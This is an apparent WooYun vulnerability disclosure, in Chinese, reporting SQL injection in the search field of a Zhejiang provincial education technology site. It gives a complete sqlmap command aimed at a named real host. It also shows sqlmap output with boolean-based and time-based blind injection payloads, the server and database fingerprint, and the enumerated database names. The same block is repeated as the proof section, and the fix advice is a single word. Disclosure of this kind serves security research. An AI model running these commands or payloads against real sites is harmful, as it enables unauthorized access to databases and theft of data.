wybug_title: 浙江省教育技术中心某站SQL注入
wybug_detail:
漏洞详情 披露状态：   									2015-08-11：	细节已通知厂商并且等待厂商处理中									2015-08-14：	厂商已经确认，细节仅向厂商公开									2015-08-24：	细节向核心白帽子及相关领域专家公开									2015-09-03：	细节向普通白帽子公开									2015-09-13：	细节向实习白帽子公开									2015-09-28：	细节向公众公开  简要描述： 浙江省教育技术中心某站SQL注入 详细说明：  http://jydd.zjedu.org/common/key_xxgl.php 搜索框存在SQL注入sqlmap注入链接：
sqlmap -u "http://twy.zjedu.org/search/key_xxgl.php" --data "key=11&submit.x=11&submit.y=14" -p key --dbs

sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: key (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: key=11%' AND 4744=4744 AND '%'='&submit.x=11&submit.y=14    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: key=11%' AND (SELECT * FROM (SELECT(SLEEP(5)))CbgG) AND '%'='&submit.x=11&submit.y=14---[10:02:59] [INFO] the back-end DBMS is MySQLweb server operating system: Linux CentOS 5.10web application technology: Apache 2.2.3, PHP 5.1.6back-end DBMS: MySQL 5.0.12[10:02:59] [INFO] fetching database names
数据库：available databases [3]:[*] information_schema[*] test[*] zjtwy   漏洞证明：  http://jydd.zjedu.org/common/key_xxgl.php 搜索框存在SQL注入sqlmap注入链接：
sqlmap -u "http://twy.zjedu.org/search/key_xxgl.php" --data "key=11&submit.x=11&submit.y=14" -p key --dbs

sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: key (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: key=11%' AND 4744=4744 AND '%'='&submit.x=11&submit.y=14    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: key=11%' AND (SELECT * FROM (SELECT(SLEEP(5)))CbgG) AND '%'='&submit.x=11&submit.y=14---[10:02:59] [INFO] the back-end DBMS is MySQLweb server operating system: Linux CentOS 5.10web application technology: Apache 2.2.3, PHP 5.1.6back-end DBMS: MySQL 5.0.12[10:02:59] [INFO] fetching database names
数据库：available databases [3]:[*] information_schema[*] test[*] zjtwy   修复方案：  过滤   版权声明：转载请注明来源 xiaokong@乌云
